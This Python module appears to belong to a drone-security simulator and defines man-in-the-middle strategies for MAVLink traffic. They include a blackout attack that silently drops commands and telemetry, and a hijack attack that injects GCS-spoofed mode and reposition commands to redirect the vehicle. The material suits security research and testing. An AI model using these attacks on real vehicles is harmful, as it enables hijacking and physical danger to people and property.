"""
Pluggable man-in-the-middle strategies.

A strategy decides what happens to each message the MITM intercepts on the two
primary directions of the GCS<->vehicle link:

- ``on_downlink``  — telemetry travelling Logic -> GCS
- ``on_uplink``    — commands travelling GCS -> Logic

Each hook returns the (possibly modified) message to forward it, or ``None`` to
drop it. Strategies may also *inject* their own messages via the
:class:`MITMContext` handed to :meth:`MITMStrategy.bind` at startup.

The default :class:`PassthroughStrategy` forwards everything unchanged. New
attacks subclass :class:`MITMStrategy` and register with
:func:`register_strategy`; the notebook selects one by name and supplies params.
"""

from __future__ import annotations

import logging
import math
import threading
from typing import TypeAlias, cast

from pymavlink.dialects.v20 import ardupilotmega as mavlink

from simulator.helpers.connections import MAVConnection

MAVMsg: TypeAlias = mavlink.MAVLink_message
Params = dict[str, float]


class MITMContext:
    """
    Handle that lets a strategy inject MAVLink into the proxied links.

    The MITM owns the two outbound connections; a strategy uses this context to
    originate messages (spoofing, command injection) rather than only
    transforming messages that happen to pass through.
    """

    def __init__(
        self,
        sysid: int,
        to_logic: MAVConnection,
        to_gcs: MAVConnection,
    ) -> None:
        self.sysid = sysid
        self._to_logic = to_logic
        self._to_gcs = to_gcs
        # Encoder used to pack injected messages. srcSystem 255 makes injected
        # commands look like they came from the real GCS.
        self._encoder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)
        self._lock = threading.Lock()

    def inject_to_logic(self, msg: MAVMsg) -> None:
        """Send an attacker-originated message toward the vehicle's Logic."""
        with self._lock:
            self._to_logic.write(msg.pack(self._encoder))

    def inject_to_gcs(self, msg: MAVMsg) -> None:
        """Send an attacker-originated message toward the GCS."""
        with self._lock:
            self._to_gcs.write(msg.pack(self._encoder))


class MITMStrategy:
    """Base strategy: transparent passthrough in both directions."""

    def __init__(self, params: Params | None = None) -> None:
        self.params: Params = dict(params or {})
        self.ctx: MITMContext | None = None

    def bind(self, ctx: MITMContext) -> None:
        """Receive the injection context once, before relays start."""
        self.ctx = ctx

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        """Handle a telemetry message travelling Logic -> GCS."""
        return msg

    def on_uplink(self, msg: MAVMsg) -> MAVMsg | None:
        """Handle a command message travelling GCS -> Logic."""
        return msg


class PassthroughStrategy(MITMStrategy):
    """Forward every message unmodified (default)."""


class BlackoutStrategy(MITMStrategy):
    """
    Blind the GCS: drop all commands and all telemetry.

    To avoid deadlocking the simulation, the attacker keeps the link *looking*
    alive: ``HEARTBEAT`` (the GCS blocks on ``wait_heartbeat`` at startup) and
    the ``LOGIC_DONE`` completion signal are still forwarded. Everything else —
    position, mission state, attitude, and all GCS commands — is suppressed.
    """

    #: Downlink message types always forwarded so the sim can run/terminate.
    _ALLOW_DOWNLINK: frozenset[str] = frozenset({"HEARTBEAT", "STATUSTEXT"})

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        """Drop all telemetry except the keep-alive heartbeat and completion signal."""
        msg_type = msg.get_type()
        if msg_type == "HEARTBEAT":
            return msg
        # Let the LOGIC_DONE completion handshake through; drop other statustext.
        if msg_type == "STATUSTEXT" and getattr(msg, "text", "") == "LOGIC_DONE":
            return msg
        return None

    def on_uplink(self, msg: MAVMsg) -> MAVMsg | None:
        """Drop every command; the GCS cannot reach the vehicle."""
        return None


class HijackStrategy(MITMStrategy):
    """
    Attacker-driven intervention.

    Watches ``MISSION_CURRENT`` on the relayed telemetry and, once
    ``seq >= trigger_seq``, injects ``SET_MODE(GUIDED)`` + ``DO_REPOSITION``
    toward the vehicle — the same redirect the GCS performed, but originated by
    the man-in-the-middle and spoofed to look like it came from the GCS.

    Params: ``trigger_seq`` (default 1), ``target_lat``, ``target_lon``,
    ``target_alt``.
    """

    _GUIDED_CUSTOM_MODE = 4  # ArduCopter GUIDED

    def __init__(self, params: Params | None = None) -> None:
        super().__init__(params)
        self.trigger_seq = int(self.params.get("trigger_seq", 1))
        self.target_lat = float(self.params.get("target_lat", 0.0))
        self.target_lon = float(self.params.get("target_lon", 0.0))
        self.target_alt = float(self.params.get("target_alt", 0.0))
        self._fired = False
        # Builder used only to construct message objects (packed by the context).
        self._builder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)

    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
        """Fire the reposition injection once the mission reaches the trigger seq."""
        if not self._fired and msg.get_type() == "MISSION_CURRENT":
            mission_current = cast(mavlink.MAVLink_mission_current_message, msg)
            if mission_current.seq >= self.trigger_seq:
                self._inject_reposition()
                self._fired = True
        return msg  # visible hijack: telemetry still flows to the GCS

    def _inject_reposition(self) -> None:
        if self.ctx is None:
            logging.error("HijackStrategy not bound to a MITMContext; cannot inject")
            return
        sysid = self.ctx.sysid
        logging.info(
            "MITM hijack: redirecting vehicle %s to (%.7f, %.7f, %.1f)",
            sysid,
            self.target_lat,
            self.target_lon,
            self.target_alt,
        )
        set_mode = self._builder.set_mode_encode(
            sysid,
            mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            self._GUIDED_CUSTOM_MODE,
        )
        self.ctx.inject_to_logic(set_mode)
        reposition = self._builder.command_int_encode(
            sysid,
            1,  # autopilot component
            mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
            mavlink.MAV_CMD_DO_REPOSITION,
            0,  # current
            0,  # autocontinue
            -1.0,  # param1: speed, no change
            1.0,  # param2: MAV_DO_REPOSITION_FLAGS_CHANGE_MODE
            0.0,  # param3
            math.nan,  # param4: yaw, no change
            int(self.target_lat * 1e7),
            int(self.target_lon * 1e7),
            self.target_alt,
        )
        self.ctx.inject_to_logic(reposition)


_STRATEGIES: dict[str, type[MITMStrategy]] = {
    "passthrough": PassthroughStrategy,
    "blackout": BlackoutStrategy,
    "hijack": HijackStrategy,
}


def register_strategy(name: str, strategy: type[MITMStrategy]) -> None:
    """Register a strategy class under ``name`` so it is selectable by config."""
    _STRATEGIES[name] = strategy


def get_strategy(name: str, params: Params | None = None) -> MITMStrategy:
    """Instantiate the strategy registered under ``name`` (default: passthrough)."""
    strategy_cls = _STRATEGIES.get(name)
    if strategy_cls is None:
        logging.warning("Unknown MITM strategy %r; falling back to passthrough", name)
        strategy_cls = PassthroughStrategy
    return strategy_cls(params)
